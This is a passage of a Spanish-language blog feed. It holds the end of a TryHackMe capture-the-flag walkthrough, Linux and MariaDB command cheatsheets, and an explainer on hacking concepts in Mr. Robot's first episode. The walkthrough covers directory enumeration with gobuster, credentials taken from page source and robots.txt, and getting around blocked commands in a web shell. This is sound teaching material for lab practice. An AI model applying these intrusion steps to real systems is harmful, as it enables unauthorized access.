</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/images/maquinas/nmap.png" alt="nmap" /></p>

<p>Vemos que hay dos puertos abiertos, empezaremos por revisar el <strong>servidor web del puerto 80</strong> (<em>las instrucciones nos mencionaban un servidor web</em>).</p>

<h3 id="servidor-web">Servidor web</h3>
<p><img src="/assets/images/maquinas/web_server.png" alt="Servidor" /></p>

<p>La página principal nos da a entender que habrá un <code class="language-plaintext highlighter-rouge">login</code>, pero al parecer tendremos que encontrar las credenciales por nuestra cuenta.</p>

<p>Ver este servidor web me dio ganas de utilizar <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>

<h3 id="gobuster">gobuster</h3>
<p>Vamos a enumerar los directorios web de este servidor con la <code class="language-plaintext highlighter-rouge">wordlist</code> <code class="language-plaintext highlighter-rouge">/dirb/common.txt</code>, quizá nos encontremos algo interesante.</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-u</span> http://&lt;ip&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/images/maquinas/gobuster.png" alt="gobuster" /></p>

<p>Los páginas disponibles (<code class="language-plaintext highlighter-rouge">status: 200</code>) son:</p>
<ul>
  <li>index.html</li>
  <li>robots.txt</li>
  <li>login.php</li>
</ul>

<p>Efectivamente hay un login, pero aún necesitamos un usuario y contraseña, tal vez el contenido de <code class="language-plaintext highlighter-rouge">robots.txt</code> sea una de las dos:</p>

<p><img src="/assets/images/maquinas/robots.png" alt="robots.txt" /></p>

<p>No nos quedan más páginas para analizar, pero tal vez revisando el <strong>código fuente</strong> nos sea útil, veamos el de <code class="language-plaintext highlighter-rouge">login.php</code>:</p>

<p><img src="/assets/images/maquinas/login_source.png" alt="login.php" /></p>

<p>Podemos ver que Rick utilizó un comentario para guardar su usuario, por lo tanto, el texto que encontramos en <code class="language-plaintext highlighter-rouge">robots.txt</code> puede que sea nuestra contraseña, intentemos con eso.</p>

<hr />
<h2 id="ataque">Ataque</h2>
<p>¡Encontramos las credenciales del login! Ahora parece que tenmos acceso a una <code class="language-plaintext highlighter-rouge">web shell</code>, si introducimos <code class="language-plaintext highlighter-rouge">pwd</code> nos regresa:</p>

<p><img src="/assets/images/maquinas/pwd.png" alt="pwd" /></p>

<p>Por lo tanto, podemos utilizar este formulario para navegar por el sistema y encontrar los ingredientes necesarios. Hay que tener en cuenta que si utilizamos <code class="language-plaintext highlighter-rouge">cd</code>, no habrá un efecto en nuestra ruta actual, por lo que usaremos <strong>rutas absolutas</strong>.</p>

<h3 id="primer-ingrediente">Primer ingrediente</h3>
<p>Si hacemos un <code class="language-plaintext highlighter-rouge">ls</code>, vemos los archivos que están en el directorio del servidor web, y hay uno sospechoso con nombre <code class="language-plaintext highlighter-rouge">Sup3rS3cretPicl3Ingred.txt</code>. Veamos qué contiene.
Al parecer <code class="language-plaintext highlighter-rouge">cat</code>, <code class="language-plaintext highlighter-rouge">less</code>, <code class="language-plaintext highlighter-rouge">head</code> y otros comandos están siendo bloqueados en esta web shell, así que usaremos <code class="language-plaintext highlighter-rouge">nl</code> para ver el contenido.</p>

<p><img src="/assets/images/maquinas/first.png" alt="Firs Ingred" /></p>

<p>Así que, aquí tenemos el primero, veamos dónde están los otros. 
El archivo <code class="language-plaintext highlighter-rouge">clue.txt</code> nos dice que busquemos en todo el sistema, así que revisemos los directorios <code class="language-plaintext highlighter-rouge">home</code>.</p>

<h3 id="segundo-ingrediente">Segundo ingrediente</h3>
<p>El directorio <code class="language-plaintext highlighter-rouge">/home/rick</code> contiene un archivo llamado <code class="language-plaintext highlighter-rouge">second ingredients</code>, vaya, vaya…</p>

<p><img src="/assets/images/maquinas/second.png" alt="Second Ingred" /></p>

<p>Sólo nos falta uno, sigamos.</p>]]></content><author><name>Jimmy Mendoza</name></author><category term="maquina" /><category term="maquinas" /><category term="linux" /><category term="tryhackme" /><category term="easy_machine" /><category term="pentesting" /><summary type="html"><![CDATA[Máquina de Try Hack Me con temática de Rick & Morty]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Cheatsheet de Linux</title><link href="http://localhost:4000/linux-cheatsheet/" rel="alternate" type="text/html" title="Cheatsheet de Linux" /><published>2023-04-14T00:00:00+00:00</published><updated>2023-06-18T17:53:28+00:00</updated><id>http://localhost:4000/linux-cheatsheet</id><content type="html" xml:base="http://localhost:4000/linux-cheatsheet/"><![CDATA[<h1 id="comandos-en-linux">Comandos en Linux</h1>

<p>Sintaxis general de los comandos en Linux:</p>
<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>comando <span class="nt">-opcion</span> argumentos
<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/  <span class="c"># ejemplo </span>
<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> /etc/ <span class="nt">-la</span>  <span class="c"># tambien es posible. menos comun</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />
<h2 id="buscar-archivos">Buscar archivos</h2>

<table>
  <thead>
    <tr>
      <th>Descripción</th>
      <th>Comando</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Busca un archivo en todo el sistema, propiedad del usuario <strong>usuario7</strong> y del grupo <strong>grupo6</strong> con tamaño de 33 bytes</td>
      <td><code class="language-plaintext highlighter-rouge">find / -type f -size 33c -user usuario7 -group grupo6 2&gt;/dev/null</code></td>
    </tr>
    <tr>
      <td>Busca un archivo en el directorio actual, sin permisos de ejecución, con tamaño de 1033 bytes y muestra su contenido</td>
      <td><code class="language-plaintext highlighter-rouge">find ./ -type f ! -executable -size 1033c -exec cat {} \;</code></td>
    </tr>
  </tbody>
</table>

<h2 id="manipulación-de-texto">Manipulación de texto</h2>

<h3 id="cambiar-posición-de-caractéres">Cambiar posición de caractéres</h3>

<table>
  <thead>
    <tr>
      <th>Descripción</th>
      <th>Comando</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Rota los caractéres 13 posiciones (cifra Caesar)</td>
      <td><code class="language-plaintext highlighter-rouge">cat &lt;file&gt; | tr [a-mn-zA-MN-Z] [n-za-mN-ZA-M]</code></td>
    </tr>
  </tbody>
</table>

<h3 id="eliminar-palabras">Eliminar palabras</h3>

<table>
  <thead>
    <tr>
      <th>Descripción</th>
      <th>Comando</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Elimina palabras de menos de <em>x</em> caractéres</td>
      <td><code class="language-plaintext highlighter-rouge">sed -r '/^.{,&lt;x&gt;}$/d' &lt;archivo&gt;</code></td>
    </tr>
    <tr>
      <td>Elimina palabras sin caractéres especiales</td>
      <td><code class="language-plaintext highlighter-rouge">sed -r '/[!-/:-@\[-\{-~]+/!d' &lt;archivo&gt;</code></td>
    </tr>
    <tr>
      <td>Elimina palabras sin números</td>
      <td><code class="language-plaintext highlighter-rouge">sed -ri '/[0-9]+/!d' &lt;archivo&gt;</code></td>
    </tr>
  </tbody>
</table>

<hr />
<h2 id="administración-de-usuarios-y-grupos">Administración de usuarios y grupos</h2>
<p>Los siguientes comandos se ejecutan con <code class="language-plaintext highlighter-rouge">sudo</code> o con usuario <code class="language-plaintext highlighter-rouge">root</code>.</p>

<h3 id="usuarios">Usuarios</h3>

<table>
  <thead>
    <tr>
      <th>Acción</th>
      <th>Comando</th>
      <th>Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Crear</td>
      <td><code class="language-plaintext highlighter-rouge">useradd -m -shell &lt;/ruta/ala/shell&gt; &lt;nombre&gt;</code></td>
      <td>Crea un nuevo usuario con su directorio home y se especifica su shell por default</td>
    </tr>
    <tr>
      <td>Cambiar contraseña</td>
      <td><code class="language-plaintext highlighter-rouge">passwd &lt;usuario&gt;</code></td>
      <td>Cambia/establece la contraseña para el usuario especificado</td>
    </tr>
    <tr>
      <td>Eliminar</td>
      <td><code class="language-plaintext highlighter-rouge">userdel &lt;usuario&gt;</code></td>
      <td>Elimina el usuario especificado</td>
    </tr>
  </tbody>
</table>

<h3 id="grupos">Grupos</h3>

<table>
  <thead>
    <tr>
      <th>Acción</th>
      <th>Comando</th>
      <th>Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Crear</td>
      <td><code class="language-plaintext highlighter-rouge">groupadd &lt;nombre&gt;</code></td>
      <td>Crea un grupo con el nombre especificado</td>
    </tr>
    <tr>
      <td>Agregar usuarios</td>
      <td><code class="language-plaintext highlighter-rouge">usermod -aG &lt;grupo&gt; &lt;usuario&gt;</code></td>
      <td>Agrega el usuario al grupo especificado</td>
    </tr>
  </tbody>
</table>

<hr />
<h2 id="iptables">iptables</h2>
<p>Los siguientes comandos se ejecutan con <code class="language-plaintext highlighter-rouge">sudo</code> o con usuario <code class="language-plaintext highlighter-rouge">root</code>.</p>
<h3 id="filter-table">Filter Table</h3>

<table>
  <thead>
    <tr>
      <th>Acción</th>
      <th>Comando</th>
      <th>Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Política de entrada</td>
      <td><code class="language-plaintext highlighter-rouge">iptables --policy INPUT &lt;ACCEPT/DROP&gt;</code></td>
      <td>Establece la política de entrada a aceptar/rechazar</td>
    </tr>
    <tr>
      <td>Filtrar por ip</td>
      <td><code class="language-plaintext highlighter-rouge">iptables -I INPUT -s &lt;ip&gt; -j DROP</code></td>
      <td>Rechaza la conexión proveniente de la ip especificada</td>
    </tr>
    <tr>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">iptables -I OUTPUT -d &lt;ip&gt; -j DROP</code></td>
      <td>Rechaza las conexiones a la ip especificada</td>
    </tr>
    <tr>
      <td>Filtrar por puerto</td>
      <td><code class="language-plaintext highlighter-rouge">iptables -I INPUT -p tcp --dport 80 -j DROP</code></td>
      <td>Rechaza las conexiones <code class="language-plaintext highlighter-rouge">tcp</code> al puerto 80</td>
    </tr>
    <tr>
      <td>Listar cadenas</td>
      <td><code class="language-plaintext highlighter-rouge">iptables -L --line-numbers</code></td>
      <td>Lista las cadenas con numeración</td>
    </tr>
    <tr>
      <td>Eliminar cadena</td>
      <td><code class="language-plaintext highlighter-rouge">iptables -D INPUT &lt;n&gt;</code></td>
      <td>Elimina la cadena especificada</td>
    </tr>
  </tbody>
</table>]]></content><author><name>Jimmy Mendoza</name></author><category term="[&quot;cheatsheet&quot;, &quot;linux&quot;]" /><category term="linux" /><category term="cheatsheet" /><category term="comandos" /><summary type="html"><![CDATA[Mi recopilación de comandos para el uso de Linux.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Cheatsheet de MariaDB</title><link href="http://localhost:4000/sql-cheatsheet/" rel="alternate" type="text/html" title="Cheatsheet de MariaDB" /><published>2023-04-14T00:00:00+00:00</published><updated>2023-04-14T00:00:00+00:00</updated><id>http://localhost:4000/sql-cheatsheet</id><content type="html" xml:base="http://localhost:4000/sql-cheatsheet/"><![CDATA[<h1 id="mariadb">MariaDB</h1>

<hr />
<h2 id="base-de-datos">Base de datos</h2>

<table>
  <thead>
    <tr>
      <th>Acción</th>
      <th>Comando</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Crear</td>
      <td><code class="language-plaintext highlighter-rouge">CREATE DATABASE nombre_db;</code></td>
    </tr>
    <tr>
      <td>Eliminar</td>
      <td><code class="language-plaintext highlighter-rouge">DROP DATABASE nombre_db;</code></td>
    </tr>
    <tr>
      <td>Listar</td>
      <td><code class="language-plaintext highlighter-rouge">SHOW DATABASES;</code></td>
    </tr>
  </tbody>
</table>

<hr />
<h2 id="tablas">Tablas</h2>

<table>
  <thead>
    <tr>
      <th>Acción</th>
      <th>Comando</th>
      <th>Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Crear tabla</td>
      <td><code class="language-plaintext highlighter-rouge">CREATE TABLE nombre_tabla(columna1 INT(5) AUTO_INCREMENT PRIMARY KEY NOT NULL, columna2 VARCHAR(20) NOT NULL DEFAULT "x", columna3 DATE);</code></td>
      <td>Crea una tabla con tres columnas con sus respectivos tipos de datos</td>
    </tr>
    <tr>
      <td>Eliminar tabla</td>
      <td><code class="language-plaintext highlighter-rouge">DROP TABLE nombre_tabla;</code></td>
      <td>Elimina la tabla especificada</td>
    </tr>
    <tr>
      <td>Listar</td>
      <td><code class="language-plaintext highlighter-rouge">SHOW TABLES;</code></td>
      <td>Lista todas las tablas de la base de datos</td>
    </tr>
  </tbody>
</table>

<h3 id="modificar">Modificar</h3>

<table>
  <thead>
    <tr>
      <th>Acción</th>
      <th>Comando</th>
      <th>Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Agregar columna</td>
      <td><code class="language-plaintext highlighter-rouge">ALTER TABLE nombre_tabla ADD COLUMN nueva_columna DECIMAL(6,2) NOT NULL AFTER columna2;</code></td>
      <td>Agrega una nueva columna especificando su tipo de dato después de cierta columna</td>
    </tr>
    <tr>
      <td>Cambiar tipo de columna</td>
      <td><code class="language-plaintext highlighter-rouge">ALTER TABLE nombre_tabla MODIFY columna VARCHAR(20) NOT NULL UNIQUE;</code></td>
      <td>Altera el tipo de dato que almacena la columna</td>
    </tr>
    <tr>
      <td>Cambiar nombre de columna</td>
      <td><code class="language-plaintext highlighter-rouge">ALTER TABLE nombre_tabla CHANGE COLUMN nombre nuevo_nombre DECIMAL(6,2) NOT NULL;</code></td>
      <td>Cambia el nombre de una columna a la vez que se especifica su tipo de dato</td>
    </tr>
  </tbody>
</table>

<h3 id="llaves">Llaves</h3>

<table>
  <thead>
    <tr>
      <th>Acción</th>
      <th>Comando</th>
      <th>Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Agregar PK</td>
      <td><code class="language-plaintext highlighter-rouge">ALTER TABLE nombre_tabla ADD PRIMARY KEY(columna);</code></td>
      <td>Establece como llave primaria una columna de la tabla</td>
    </tr>
    <tr>
      <td>Eliminar PK</td>
      <td><code class="language-plaintext highlighter-rouge">ALTER TABLE nombre_tabla DROP PRIMARY KEY;</code></td>
      <td>Elimina la llave primaria de una tabla</td>
    </tr>
    <tr>
      <td>Agregar FK</td>
      <td><code class="language-plaintext highlighter-rouge">ALTER TABLE nombre_tabla ADD CONSTRAINT FOREIGN KEY(columna) REFERENCES tabla2(col_pk);</code></td>
      <td>Establece una llave foránea que referencia a la llave primaria de otra tabla</td>
    </tr>
    <tr>
      <td>Eliminar FK</td>
      <td><code class="language-plaintext highlighter-rouge">ALTER TABLE nombre_tabla DROP FOREIGN KEY col_fk;</code></td>
      <td>Elimina la llave foránea de una columna</td>
    </tr>
  </tbody>
</table>

<hr />
<h2 id="registros">Registros</h2>

<h3 id="mostrar">Mostrar</h3>

<table>
  <thead>
    <tr>
      <th>Acción</th>
      <th>Comando</th>
      <th>Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Mostrar todos</td>
      <td><code class="language-plaintext highlighter-rouge">SELECT * FROM nombre_tabla;</code></td>
      <td>Muestra todos los registros de la tabla especificada</td>
    </tr>
    <tr>
      <td>Mostrar algunas columnas</td>
      <td><code class="language-plaintext highlighter-rouge">SELECT col1, col2, col3 FROM nombre_tabla;</code></td>
      <td>Muestra todos los registros de las columnas especificadas</td>
    </tr>
    <tr>
      <td>Filtrar</td>
      <td><code class="language-plaintext highlighter-rouge">SELECT * FROM nombre_tabla WHERE columna = "xxx";</code></td>
      <td>Muestra los registros donde <code class="language-plaintext highlighter-rouge">columna</code> tenga valor <code class="language-plaintext highlighter-rouge">xxx</code></td>
    </tr>
    <tr>
      <td>Ordenar</td>
      <td><code class="language-plaintext highlighter-rouge">SELECT col1, col2 FROM nombre_tabla ORDER BY col2 ASC LIMIT 0,20;</code></td>
      <td>Muestra los 20 registros de las columnas especificadas, ordenando en formato ascendente la columna 2</td>
    </tr>
    <tr>
      <td>Agrupar</td>
      <td><code class="language-plaintext highlighter-rouge">SELECT * FROM nombre_tabla GROUP BY columna;</code></td>
      <td>Muestra los registros agrupados por la columna especificada</td>
    </tr>
  </tbody>
</table>

<h3 id="actualizar-y-borrar">Actualizar y borrar</h3>

<table>
  <thead>
    <tr>
      <th>Acción</th>
      <th>Comando</th>
      <th>Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Actualizar</td>
      <td><code class="language-plaintext highlighter-rouge">UPDATE nombre_tabla SET col1 = "xxx" col2 = "yyy", WHERE col3 = "zzz";</code></td>
      <td>Actualiza los registros que coincidan con la cláusula <code class="language-plaintext highlighter-rouge">WHERE</code>, <strong>si no se utiliza <code class="language-plaintext highlighter-rouge">WHERE</code> se actualizará toda la tabla</strong></td>
    </tr>
    <tr>
      <td>Borrar</td>
      <td><code class="language-plaintext highlighter-rouge">DELETE FROM nombre_tabla WHERE identifier = "xxx";</code></td>
      <td>Borra los registros que coincidan con la condición, al igual que <code class="language-plaintext highlighter-rouge">UPDATE</code> <strong>si no se usa <code class="language-plaintext highlighter-rouge">WHERE</code> se eliminarán todos los registros de la tabla</strong></td>
    </tr>
  </tbody>
</table>

<hr />
<h2 id="importar--exportar">Importar / Exportar</h2>
<p><strong>Los siguientes comandos se ejecutan desde la terminal del usuario.</strong></p>

<table>
  <thead>
    <tr>
      <th>Acción</th>
      <th>Comando</th>
      <th>Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Importar</td>
      <td><code class="language-plaintext highlighter-rouge">mariadb -u usuario -p nombre_bd &lt; script.mysql</code></td>
      <td>Importa el contenido del script en la bd especificada</td>
    </tr>
    <tr>
      <td>Exportar</td>
      <td><code class="language-plaintext highlighter-rouge">mysqldump -u usuario -p nombre_bd &gt; bd.mysql</code></td>
      <td>Exporta el contenido de una bd a un script</td>
    </tr>
  </tbody>
</table>]]></content><author><name>Jimmy Mendoza</name></author><category term="cheatsheet" /><category term="sql" /><category term="cheatsheet" /><category term="comandos" /><category term="bd" /><summary type="html"><![CDATA[Mi recopilación de comandos para usar mariadb o mysql desde la terminal.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">1x1 Hello Friend</title><link href="http://localhost:4000/1x1-hello-friend/" rel="alternate" type="text/html" title="1x1 Hello Friend" /><published>2023-04-12T00:00:00+00:00</published><updated>2023-06-18T17:53:28+00:00</updated><id>http://localhost:4000/1x1-hello-friend</id><content type="html" xml:base="http://localhost:4000/1x1-hello-friend/"><![CDATA[<h1 id="hello-friend">Hello Friend</h1>

<h2 id="el-café-de-ron">El café de Ron</h2>
<h3 id="conexión-de-fibra-óptica">Conexión de fibra óptica</h3>
<p>Esta escena es una de mis favoritas, Elliot está en <em>El Café de Ron</em>, entra Ron, el dueño del local, y Elliot lo confronta. Primero le dice que la razón que va ahí es porque el Wi-Fi es rápido, tiene <strong>conexión de fibra óptica con velocidades gigabit</strong>.</p>

<p>En el presente muchas de nuestras casas ya cuentan con conexión de fibra óptica, pero para el año en el que salió la serie (2015), la fibra óptica aún era una novedad. Justo esto fue lo que le pareció extraño a Elliot, por lo que procedió a interceptar el tráfico de la red.</p>

<h3 id="interceptar-el-tráfico-de-la-red">Interceptar el tráfico de la red</h3>
<p>La serie no dice con qué herramienta Elliot hizo esto, pero algunas de las herramientas que se pueden usar para este fin son <code class="language-plaintext highlighter-rouge">wireshark</code> y <code class="language-plaintext highlighter-rouge">tcpdump</code>. Este proceso consiste en estar conectado a una red y con una de las herramientas mencionadas empezar a <em>escuchar</em> las comunicaciones que viajan por esa red. Es como si estando en un parque te enfocas en las dos personas que están sentadas conversando y agudizas tu oído para captar todo lo que están diciendo.</p>

<p>Interceptar/escuchar el tráfico de una red nos da la oportunidad de verificar que la red está en buenas condiciones, notar tráfico inusual o, incluso, espiar.</p>

<p>A continuación, Elliot dice que decidió <em>hackear</em> a Ron, no se especifica qué hizo exactamente, pero es probable que con el análisis del tráfico de la red diera con el sitio que Ron estaba operando, <em>Los chicos de Plato</em>, ingresara (de alguna forma) como administrador y copiara todo el contenido del sitio como evidencia, incluso los correos.</p>

<h3 id="servidores">Servidores</h3>
<p>Un servidor es una computadora dedicada a proveer <em>recursos</em> a otras computadoras. El tipo de servidor que se menciona aquí es un <strong>servidor web</strong>, el cual provee el contenido de Los chicos de Plato. Si el servidor es cerrado y borrado, este sitio y todo su contenido dejan de existir.</p>

<p>La razón de que Elliot haya confrontado a Ron es porque si lo hacía de manera remota, había la posibilidad que Ron huyera y cerrara los servidores de su sitio.</p>

<h3 id="red-tor">Red Tor</h3>
<p>Tor es una <a href="../la-red-mas-simple#Red">red</a> que funciona de forma especial: está enfocada a <strong>anonimizar a sus usuarios</strong>. Quienes se conectan a esta red quieren dificultar el proceso de ser identificados. La <a href="https://www.youtube.com/watch?v=79m7mX3rC8Q">red Tor</a> utiliza el protocolo <code class="language-plaintext highlighter-rouge">onion</code> para lograr enmascarar a sus usuarios.</p>

<p><img src="/assets/images/posts/red_tor.png" alt="Red Tor" /></p>

<h4 id="protocolo-onion">Protocolo onion</h4>
<p>Este protocolo trabaja por capas (por eso el <em>onion</em>), con estas capas logra ofuscar la identificación de los usuarios y encriptar sus comunicaciones.</p>

<p>Pese a todo esto, como Elliot dice: <em>la red Tor no es tan anónima como crees</em>. Vamos, no es una herramienta mágica que te hace invisible, aún en su diseño tiene algunos puntos débiles. Si alguien analiza el tamaño de los mensajes y la frecuencia de la comunicación entre el usuario y en nodo de entrada, y aparte tiene acceso al nodo de salida, donde las comunicaciones ya no están encriptadas por la red Tor, es posible conocer el tráfico del usuario (justo lo que conocía Elliot).</p>

<h3 id="en-resumen">En resumen…</h3>
<p>Resumiendo lo que Elliot hizo en esta escena:</p>
<ol>
  <li>Le gustaba la velocidad de la red del café</li>
  <li>Notó tráfico raro</li>
  <li>Capturó y analizó el tráfico de la red</li>
  <li>Encontró el nodo de salida de la red Tor y descubrió sus servidores de Ron</li>
  <li>Ingresó a los servidores de Los chicos de Plato</li>
  <li>Descargó todo su contenido y correos</li>
  <li>Hizo una denuncia y confrontó a Ron en lo que llegaba el FBI</li>
</ol>

<p><img src="/assets/images/posts/ron's_coffee.png" alt="El café de Ron" /></p>

<hr />

<h2 id="allsafe">Allsafe</h2>

<h3 id="log-file">Log file</h3>
<p>Los <code class="language-plaintext highlighter-rouge">log files</code> son archivos en lo que se lleva un registro de todas las acciones realizadas en un sistema. Este tipo de archivos son muy importantes para los administradores del sistema porque cuando ocurre un ataque o una brecha de seguridad, analizar los log files puede dar pistas de cómo ocurrió dicho ataque.</p>

<p>Mirando el log file del servidor Elliot pudo determinar que el ataque que sufrieron fue un ataque <a href="https://www.cloudflare.com/learning/ddos/ddos-attack-tools/r-u-dead-yet-rudy/"><code class="language-plaintext highlighter-rouge">RUDY</code></a>.</p>

<h3 id="rudy-attack">RUDY attack</h3>
<p><strong>R U Dead Yet?</strong> (¿ya estás muerto?) es un ataque de tipo DoS (abajo explicado), el cual explota servidores que reciben información de formularios a través de enviar respuestas muy largas de forma muy lenta. El servidor tiene que esperar a que llegue toda la respuesta, por lo que estará siendo realentizado y no podrá atender a otros usuarios de forma efectiva. Es como si al pagar en la caja del supermercado la cuenta fuera de $1,000, y tú ingresaras una moneda de $1 cada diez segundos.</p>

<h4 id="ataque-dos">Ataque DoS</h4>
<p>Los ataques de <em>Denegación de Servicio</em> (Denial of Service) son ataques que son muy comunes en la actualidad. Su propósito principal es <strong>impactar negativamente en el desempeño de un servidor</strong> para hacerlo lento, impedir que usuarios legítimos accedan a él y, en casos extremos, dejarlo inoperativo.</p>

<p>El ataque RUDY es un ejemplo de ataque DoS porque su meta es ocupar al servidor con peticiones lentas e inutiles, sin embargo hay más formas de ataques DoS, uno de los más comunes es el <a href="./#ataque-ddos"><code class="language-plaintext highlighter-rouge">DDoS</code></a>.</p>

<hr />
<h2 id="la-oficina-de-krysta">La oficina de Krysta</h2>

<h3 id="ataque-de-fuerza-bruta">Ataque de fuerza bruta</h3>
<p>Cuando conocemos por primera vez a Krysta sabemos que Elliot tiene acceso a sus cuentas de redes sociales y de correo, ¿cómo logró esto? Pues, al parecer utilizó una herramienta para hacerle fuerza bruta a sus cuentas. De hecho, en otras escenas podemos ver que se llama <code class="language-plaintext highlighter-rouge">elpscrk</code> (¿elliot-password-crack?) y la utiliza para obtener las contraseñas de Ollie y del novio de Krysta. Éste método de obtener contraseñas es conocido como <strong>ataque de fuerza bruta</strong> y consiste en probar miles e incluso millones de posibilidades hasta encontrar la correcta.</p>

<p>Esta herramienta funciona recibiendo una lista de palabras (<code class="language-plaintext highlighter-rouge">wordlist</code>), que son las posibles contraseñas para el usuario de Krysta, la wordlist que utiliza Elliot contiene 9,875,894 posibles contraseñas, la contraseña correcta la encuentra en 24 segundos.</p>

<p>En la actualidad este ataque ya no es tan fácil de hacer para sitios online, porque los <code class="language-plaintext highlighter-rouge">firewalls</code> detectan el ataque y lo bloquean, sin embargo aún es útil con distintos enfoques. Y también agregar que, en la vida real este tipo de ataques requieren de un gran poder de procesamiento y generalmente toman horas en llevarse a cabo.</p>

<h4 id="wordlist">Wordlist</h4>
<p>Una wordlist consiste en una lista de posibles credenciales (generalmente) con las que se intentará probar acceder a un sistema. Estas wordlists se pueden encontrar en línea recopiladas de bases de datos filtradas en el pasado como las SecLists, pero también se pueden <strong>crear especialmente para un objetivo</strong>, como lo hace Elliot para el novio de Krysta. Para ello hay que conocer ciertos datos de nuestro objetivo y con herramientas como <code class="language-plaintext highlighter-rouge">hydra</code> se pueden generar permutaciones de estas palabras, obteniendo una wordlist gigantesca si es necesario.</p>

<p><img src="/assets/images/posts/elpscrk.png" alt="elpscrk" /></p>

<hr />
<h2 id="ejecutivos-de-e-corp">Ejecutivos de E-Corp</h2>

<h3 id="linux">Linux</h3>
<p>Cuando los ejecutivos de E-Corp visitan Allsafe, <strong>Tyrell Wellick</strong> le dice a Elliot que al igual que él, también <strong>utiliza Linux</strong>. Y como Linux es generalmente utilizado por personas con un conocimiento más avanzado, es sorpresa para Elliot.</p>

<p>Linux es un sistema opertativo que a diferencia de Windows es de código abierto y gratuito, esto lo hace altamente configurable y adaptable, por ello existen muchas variaciones de Linux. <strong>Kali Linux y Parrot OS</strong> son dos <em>versiones</em> de este sistema operativo y están pensado específicamente para <strong>hacking y pentesting</strong>. De hecho, en la serie Elliot utiliza Kali para sus ataques.</p>

<h4 id="gnome-y-kde">Gnome y KDE</h4>
<p>También Wellick menciona <em>Gnome</em> y <em>KDE</em>, éstos son dos entornos de escritorio muy populares en Linux, básicamente lo que hacen es darle una apariencia común a las ventanas, íconos y más en el sistema operativo. Wellick es más de KDE y, a decir verdad, yo también.</p>

<table>
  <thead>
    <tr>
      <th>Ventanas de Gnome</th>
      <th>Ventanas de KDE</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><img src="https://i.stack.imgur.com/YovBy.jpg" alt="gnome" /></td>
      <td><img src="https://news-cdn.softpedia.com/images/news2/beautify-your-kde-plasma-5-desktop-environment-with-freshly-ported-adapta-theme-517792-2.jpg" alt="kde" /></td>
    </tr>
  </tbody>
</table>

<hr />
<h2 id="ataque-a-allsafe">Ataque a Allsafe</h2>

<h3 id="ataque-ddos">Ataque DDoS</h3>
<p>Los ataques <a href="./#ataque-dos"><code class="language-plaintext highlighter-rouge">DoS</code></a> son efectivos pero también son fáciles de detectar y bloquear por los <code class="language-plaintext highlighter-rouge">firewalls</code> de los servidores, si se detectan patrones de denegación de servicio proviniendo de una cierta dirección <code class="language-plaintext highlighter-rouge">IP</code>, se bloquea esa dirección y problema solucionado.
Por este motivo los atacantes han ideado ataques más complejos y más efectivos. El <strong>Distributed Denial of Service</strong> (Denegación de Servicio Distribuido) es la evolución de DoS. Con este ataque se utilizan <strong>miles o millones de dispositivos</strong> para hacer peticiones a servidores, saturandolos con tanto tráfico. De esta forma un firewall ya no es tan efectivo para diferenciar entre un atacante y un usuario legítimo que trata de utilizar el servidor.</p>

<p>Para conocer más sobre los ataques DDoS y ver un caso real, mira el siguiente <a href="https://youtu.be/_IPeU2upbaw">vídeo</a>.</p>

<p><img src="/assets/images/posts/rebooting_server.png" alt="Reinicio del servidor" />
La versión</p>

<ul>
  <li>DDoS attack
    <ul>
      <li>Reconfigure DNS</li>
      <li>Reboot the servers</li>
      <li>They are inside the network</li>
      <li>Security protocols</li>
      <li>Load sharing</li>
      <li>Redirect traffic</li>
    </ul>
  </li>
  <li>Rootkit
    <ul>
      <li>Serverfarm</li>
      <li>Backup server</li>
      <li>Autoswitch</li>
      <li>Switch DNS</li>
    </ul>
  </li>
</ul>]]></content><author><name>Jimmy Mendoza</name></author><category term="mr_robot" /><category term="series" /><summary type="html"><![CDATA[En este episodio conocemos a Elliot]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>